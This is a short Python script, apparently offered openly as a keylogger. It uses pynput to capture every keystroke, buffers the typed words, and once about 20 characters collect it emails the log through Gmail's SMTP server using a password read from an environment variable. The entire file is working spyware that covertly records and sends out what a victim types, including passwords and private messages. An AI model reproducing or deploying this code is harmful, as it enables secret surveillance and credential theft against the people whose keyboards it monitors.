from pynput.keyboard import Key, Listener
import smtplib
import os

word = ''
full_log = ''
chars_limit = 20


def keylogger(key):
    global word
    global full_log
    global chars_limit

    if key == Key.space or key == Key.enter:
        word += " "
        full_log += word
        word = ""

        if len(full_log) >= chars_limit:
            # print(full_log)

            # with open("log_file.txt", "w") as file:
            #     file.write(full_log)

            send_mail()

            full_log = ""

    elif key == Key.backspace:
        word = word[:-1]
    elif key == Key.shift_l or key == Key.shift_r:
        return
    else:
        # print(key)
        # print(type(key))
        char = f"{key}"
        char = char[1:-1]
        # print(char)
        word += char

    if key == Key.esc:
        return False


def send_mail():
    sender = "your_email"
    # your password = "your_password
    password = os.getenv("EMAIL_PASSWORD")

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender, password)
    server.sendmail(sender, sender, full_log.encode("utf-8"))


def main():
    with Listener(on_press=keylogger) as log:
        log.join()


if __name__ == "__main__":
    main()

